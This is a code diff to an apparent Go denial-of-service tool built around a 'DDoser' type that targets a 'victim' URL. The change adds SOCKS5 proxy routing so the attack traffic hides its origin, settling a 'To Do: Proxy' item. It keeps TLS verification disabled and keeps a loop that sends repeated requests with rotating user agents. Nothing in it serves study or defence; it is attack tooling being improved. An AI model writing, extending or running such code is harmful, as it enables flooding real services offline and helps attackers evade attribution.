@@ -7,6 +7,9 @@ import (
 	"net"
 	"net/http"
 	"net/url"
+	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 type DDoser struct {
@@ -14,8 +17,8 @@ type DDoser struct {
 	Request *http.Request
 }
 
-func NewDDoser(method, victim string) (*DDoser, error) {
-	var conn io.ReadWriteCloser
+func NewDDoser(method, victim, socks5 string) (*DDoser, error) {
+	var conn net.Conn
 	var req *http.Request
 	url, error := url.Parse(victim)
 
@@ -34,10 +37,20 @@ func NewDDoser(method, victim string) (*DDoser, error) {
 
 	address := fmt.Sprintf("%s:%s", url.Hostname(), url.Port())
 
+	// Native official proxy
+	client, error := proxy.SOCKS5("tcp", socks5, nil, &net.Dialer{
+		Timeout:   5 * time.Second,
+		KeepAlive: 5 * time.Second,
+	})
+
+	if error != nil {
+		return nil, error
+	}
+
+	conn, error = client.Dial("tcp", address)
+
 	if url.Scheme == "https" {
-		conn, error = tls.Dial("tcp", address, &tls.Config{InsecureSkipVerify: true})
-	} else {
-		conn, error = net.Dial("tcp", address)
+		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
 	}
 
 	if error != nil {
@@ -47,7 +60,6 @@ func NewDDoser(method, victim string) (*DDoser, error) {
 	return &DDoser{conn, req}, nil
 }
 
-// To Do: Proxy
 func (d *DDoser) Do(userAgents []string, n int) {
 	defer d.Conn.Close()
 	for i := 0; i < n; i++ {
